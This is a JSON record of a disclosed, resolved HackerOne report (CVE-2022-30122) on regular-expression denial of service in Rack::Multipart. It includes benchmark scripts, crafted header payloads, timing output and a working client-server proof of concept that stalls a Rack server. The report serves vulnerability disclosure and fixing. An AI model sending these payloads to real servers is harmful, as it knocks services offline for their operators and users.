@@ -1,0 +1,345 @@
+{
+  "id": 1489141,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDg5MTQx",
+  "url": "https://hackerone.com/reports/1489141",
+  "title": "ReDoS in Rack::Multipart",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-02-22T22:34:07.597Z",
+  "submitted_at": "2022-02-22T22:34:07.663Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ooooooo_q",
+    "url": "/ooooooo_q",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/9a55e00ecd2cdf18a7f40678e6836e4cdc90bf95eb4b50c43f5fb775da40bb65"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": false,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 22,
+    "url": "https://hackerone.com/rails",
+    "handle": "rails",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+    },
+    "permissions": [
+
+    ],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "profile": {
+      "name": "Ruby on Rails",
+      "twitter_handle": "rails",
+      "website": "http://rubyonrails.org/security",
+      "about": "Web development that doesn't hurt."
+    }
+  },
+  "has_bounty?": false,
+  "in_validation?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [
+    "CVE-2022-30122"
+  ],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2023-07-28T00:26:27.997Z",
+  "bug_reporter_agreed_on_going_public_at": null,
+  "team_member_agreed_on_going_public_at": "2023-06-28T00:26:26.045Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "Hello, I found ReDoS on Rack.\n\nI found this problem using `recheck` (https://makenowjust-labs.github.io/recheck/), a ReDoS detection tool.\n\nThis tool has found multiple places where there seems to be a problem with the rack code, but since there are many and it takes time to check the behavior, I will first report on `Rack::Multipart::RFC2183`, which is the most dangerous.\nThis is detected as exponential by recheck.\n\n- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart.rb#L38\n- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L296\n\n```ruby\n❯ bundle exec irb\nirb(main):001:0> require 'rack'\n=> true\nirb(main):002:0> Rack::Multipart::RFC2183\n=> /^(?i-mx:Content-Disposition:\\s*(?-mix:[^\\s()<>,;:\\\\\"\\/\\[\\]?=]+)\\s*)((?-mix:;\\s*(?:(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)(?-mix:\\*[0-9]+)?))=((?-mix:\"(?:\\\\\"|[^\"])*\"|(?-mix:[^\\s()<>,;:\\\\\"\\/\\[\\]?=]+))))|(?-mix:(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)(?:\\*0)?\\*))=((?-mix:[a-zA-Z0-9\\-]*'[a-zA-Z0-9\\-]*'(?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%]))*)))|(?-mix:((?-mix:(?-mix:(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%])+)\\*[1-9][0-9]*\\*))=((?-mix:%[0-9a-fA-F]{2}|(?-mix:[^ \\t\\v\\n\\r)(><@,;:\\\\\"\\/\\[\\]?='*%]))*))))\\s*))+$/i\n```\n\n\n### benchmark\n\nrfc2183_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'rack'\n\nregexp = Rack::Multipart::RFC2183\n\ndef attack_text(length)\n \"Content-Disposition:G;\\f=\\\"\"  + \"=;1=\\\";\\fD=\\\";t*1*\" * length + '='\nend\n\nBenchmark.bm do |x|\n  x.report { attack_text(5)[regexp] }\n  x.report { attack_text(10)[regexp] }\n  x.report { attack_text(15)[regexp] }\n  x.report { attack_text(20)[regexp] }\n  x.report { attack_text(25)[regexp] }\n  x.report { attack_text(26)[regexp] }\nend\n```\n\n```\n❯ bundle exec ruby rfc2183_benchmark.rb\n       user     system      total        real\n   0.000018   0.000004   0.000022 (  0.000016)\n   0.000357   0.000000   0.000357 (  0.000361)\n   0.010888   0.000018   0.010906 (  0.010961)\n   0.342814   0.000717   0.343531 (  0.344750)\n  10.925193   0.022059  10.947252 ( 10.979092)\n  21.906178   0.049380  21.955558 ( 22.024203)\n```\n\n\n### PoC\n\nGemfile\n\n```ruby\n# frozen_string_literal: true\n\nsource \"https://rubygems.org\"\n\ngem 'rack', '~> 2.2', '>= 2.2.3'\ngem 'puma', '~> 5.6', '>= 5.6.2'\n```\n\nconfig.ru\n\n```ruby\nclass Server\n  def call(env)\n    Rack::Request.new(env).params\n\n    [ 200, {}, []]\n  end\nend\n\nrun Server.new\n```\n\n```ruby\nrequire \"net/http\"\nrequire \"uri\"\n\nclass Net::HTTPGenericRequest\n\n  def encode_multipart_form_data(out, params, opt)\n    charset = opt[:charset]\n    boundary = opt[:boundary]\n    buf = ''\n    params.each do |key, value|\n      buf << \"--#{boundary}\\r\\n\"\n      buf << \"Content-Disposition:G;\\f=\\\"\"  + \"=;1=\\\";\\fD=\\\";t*1*\" * 27 + '='\n      buf << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n\n      buf << \"content\"\n      buf << \"\\r\\n\"\n    end\n    buf << \"--#{boundary}--\\r\\n\"\n    flush_buffer(out, buf, false)\n  end\nend  \n\ndata = [[\"dummy\"]]\n\nurl = URI.parse('http://127.0.0.1:9292/')\nreq = Net::HTTP::Post.new(url.path)\nreq.set_form(data, \"multipart/form-data\")\n\nres = Net::HTTP.new(url.host, url.port).start do |http|\n  http.request(req)\nend\n```\n\n`bundle exec rackup` & `bundle exec ruby rfc2183_request.rb`\n\n## Impact\n\nWhen the client sends a specially crafted header, it occur ReDoS on the server side.\nI confirmed that the combination of puma, unicorn, puma + nginx, unicorn + nginx occur Redos.\n\nThere are several other places where `Rack::Multipart` is likely to be ReDoS, and it seems good to exclude it as a workaround if user do not use file upload.\n\n#### work around\n\n```ruby\nclass Rack::Request\n  def parse_multipart\n    nil\n  end\nend\n```",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+
+  ],
+  "allow_singular_disclosure_at": "2023-07-28T00:26:26.193Z",
+  "allow_singular_disclosure_after": -4948055.332177597,
+  "singular_disclosure_allowed": true,
+  "vote_count": 17,
+  "voters": [
+    "zy9ard3",
+    "neil-tsakatsa",
+    "security_sphinx",
+    "vlakhani28",
+    "paler",
+    "shivammusic",
+    "as4c",
+    "prit3shh",
+    "muzaffar1337",
+    "0xloki",
+    "and 7 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 160,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/rails/rails",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [
+
+    ],
+    "assignable_team_member_groups": [
+
+    ]
+  },
+  "activities": [
+    {
+      "id": 15593914,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "I checked `Rack::Multipart::BROKEN_QUOTED` and `Rack::Multipart::BROKEN_UNQUOTED` in the same way.\n\n- https://github.com/rack/rack/tree/2.2.3/lib/rack/multipart.rb#L19\n- https://github.com/rack/rack/tree/2.2.3/lib/rack/multipart.rb#L20\n- https://github.com/rack/rack/blob/2.2.3/lib/rack/multipart/parser.rb#L304\n\nbroken_quoted_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'rack'\n\nregexp = Rack::Multipart::BROKEN_QUOTED\n\ndef attack_text(length)\n  \"Content-Disposition:a\" + \"\\t\" * length + \"filename=\\\"\\\";\" + \"\\ta=;filename=\\\"\" * length + \"\\ta=\"\nend\n\nBenchmark.bm do |x|\n  x.report { attack_text(10)[regexp] }\n  x.report { attack_text(100)[regexp] }\n  x.report { attack_text(500)[regexp] }\nend\n```\n\n```\n❯ bundle exec ruby broken_quoted_benchmark.rb\n       user     system      total        real\n   0.000086   0.000000   0.000086 (  0.000085)\n   0.066192   0.000181   0.066373 (  0.066544)\n   8.099961   0.026991   8.126952 (  8.153716)\n```\n\nbroken_unquoted_benchmark.rb\n\n```ruby\nrequire 'benchmark'\nrequire 'rack'\n\nregexp = Rack::Multipart::BROKEN_UNQUOTED\n\ndef attack_text(length)\n  'Content-Disposition:a' + \"\\t\" * length + \"\\tfilename=m\"\nend\n\nBenchmark.bm do |x|\n  x.report { attack_text(10)[regexp] }\n  x.report { attack_text(100)[regexp] }\n  x.report { attack_text(1000)[regexp] }\n  x.report { attack_text(10000)[regexp] }\n  x.report { attack_text(100000)[regexp] }\nend\n```\n\n```\n❯ bundle exec ruby broken_unquoted_benchmark.rb\n       user     system      total        real\n   0.000006   0.000000   0.000006 (  0.000005)\n   0.000035   0.000000   0.000035 (  0.000035)\n   0.002508   0.000045   0.002553 (  0.002569)\n   0.246365   0.000167   0.246532 (  0.247299)\n  25.003012   0.064393  25.067405 ( 25.146015)\n```  \n\n`Rack::Multipart::BROKEN_UNQUOTED` is detected as `2nd degree polynomial` by `recheck`, and it seems that 10kb ~ 100kb are required to make it an attack.\n\nWhen I tried it, even if nginx is used, it seems to be treated as a body size limit (1Mb) if it is in multipart, unlike the http header size limit.\n\nThere are other regular expressions that are detected as `2nd degree polynomial`, so they are likely to be affected in the same way.",
+      "automated_response": false,
+      "created_at": "2022-02-23T07:00:18.944Z",
+      "updated_at": "2022-02-23T07:00:18.944Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 15696205,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugTriaged",
+      "message": "@ooooooo_q thanks for reporting this.  I think we should fix the ReDoS issues that you've found, but also I would like to limit the size of the header that for each multipart part that we process.\n\nI'm afraid we won't be able to fix every ReDoS issue, so we should put a limit on the amount of data that we actually parse.\n\nWe'll work on a patch and post it here for you to review.  Thank you!",
+      "automated_response": false,
+      "created_at": "2022-03-01T21:10:01.749Z",
+      "updated_at": "2022-03-01T21:10:01.749Z",
+      "actor": {
+        "username": "tenderlove",
+        "cleared": false,
+        "verified": false,
+        "url": "/tenderlove",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 17030539,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::CveIdAdded",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2022-06-07T20:23:33.688Z",
+      "updated_at": "2022-06-07T20:23:33.688Z",
+      "cve_ids": [
+        "CVE-2022-30122"
+      ],
+      "actor": {
+        "username": "tenderlove",
+        "cleared": false,
+        "verified": false,
+        "url": "/tenderlove",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 17030549,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::BugResolved",
+      "message": "This is shipped!",
+      "automated_response": false,
+      "created_at": "2022-06-07T20:24:28.883Z",
+      "updated_at": "2022-06-07T20:24:28.883Z",
+      "actor": {
+        "username": "tenderlove",
+        "cleared": false,
+        "verified": false,
+        "url": "/tenderlove",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/003/318/60d828744b5d16813ecbf975fdc453dc4a933f4f_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "reporter": {
+        "username": "ooooooo_q",
+        "url": "/ooooooo_q"
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 17062861,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tenderlove \nI have confirmed that Rack::Multipart::BROKEN_QUOTED and Rack::Multipart::BROKEN_UNQUOTED have been fixed in Rack 2.2.3.1.\n\nI see that this has not been fixed for Rack::Multipart::RFC2183, will this be fixed in a other process, or should I have made it as a separate report in hackerone?",
+      "automated_response": false,
+      "created_at": "2022-06-09T14:01:40.896Z",
+      "updated_at": "2022-06-09T14:01:40.896Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 17411006,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@tenderlove @rails\nShould it be created as a separate report?",
+      "automated_response": false,
+      "created_at": "2022-07-04T22:48:11.845Z",
+      "updated_at": "2022-07-04T22:48:11.845Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 22547955,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::AgreedOnGoingPublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-06-28T00:26:26.119Z",
+      "updated_at": "2023-06-28T00:26:26.119Z",
+      "first_to_agree": true,
+      "actor": {
+        "username": "rafaelfranca",
+        "cleared": false,
+        "verified": false,
+        "url": "/rafaelfranca",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/004/981/dd3b6bb41f9c33e3448ebbc47303f5a135f25105_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 22849079,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::Comment",
+      "message": "@rafaelfranca \n\nThe PoC in this report contains CVE-2022-44572(https://hackerone.com/reports/1639882), is it safe to disclose?",
+      "automated_response": false,
+      "created_at": "2023-07-16T07:11:33.249Z",
+      "updated_at": "2023-07-16T07:11:33.249Z",
+      "actor": {
+        "username": "ooooooo_q",
+        "cleared": false,
+        "verified": false,
+        "url": "/ooooooo_q",
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/012/811/4b35334fa2fcf93b2e510174e09470fb42bbf03a_original.gif/d9cda3948dbcdef886be5f7bc601358556d87dbd736cb28585026b898b9f4b13"
+        },
+        "hackerone_triager": false,
+        "hackerone_employee": false
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    },
+    {
+      "id": 23043593,
+      "is_internal": false,
+      "editable": false,
+      "type": "Activities::ReportBecamePublic",
+      "message": "",
+      "automated_response": false,
+      "created_at": "2023-07-28T00:26:28.105Z",
+      "updated_at": "2023-07-28T00:26:28.105Z",
+      "actor": {
+        "url": "/rails",
+        "ibb": true,
+        "profile_picture_urls": {
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/022/5e2b46658c8b86bed62f574d8e1793f353cbbc63_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
+        },
+        "profile": {
+          "name": "Ruby on Rails"
+        }
+      },
+      "genius_execution_id": null,
+      "team_handle": "rails"
+    }
+  ],
+  "activity_page_count": 1,
+  "activity_page_number": 1,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
